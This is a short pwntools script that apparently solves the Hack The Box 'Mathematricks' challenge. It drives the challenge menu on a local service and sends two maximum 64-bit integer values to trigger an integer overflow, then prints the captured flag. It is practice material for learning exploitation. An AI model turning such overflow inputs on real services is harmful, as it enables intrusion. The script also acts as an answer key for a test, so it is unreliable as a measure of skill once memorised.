# https://app.hackthebox.com/challenges/Mathematricks
# Tags: pwn, Integer Overflow
from pwn import *

warnings.filterwarnings('ignore')
context.arch = 'amd64'

IP="127.0.0.1"
PORT=1337

target = remote(IP, PORT)
target.sendlineafter('🥸 ', '1')
target.sendlineafter('> ', '2')
target.sendlineafter('> ', '1')
target.sendlineafter('> ', '0')
target.sendlineafter('n1: ', '9223372036854775807')
target.sendlineafter('n2: ', '9223372036854775807')
flag = target.recvline_contains(b"HTB").strip().decode()

print(f"[\u2714] Flag captured: \033[1;37m{flag}\033[0m")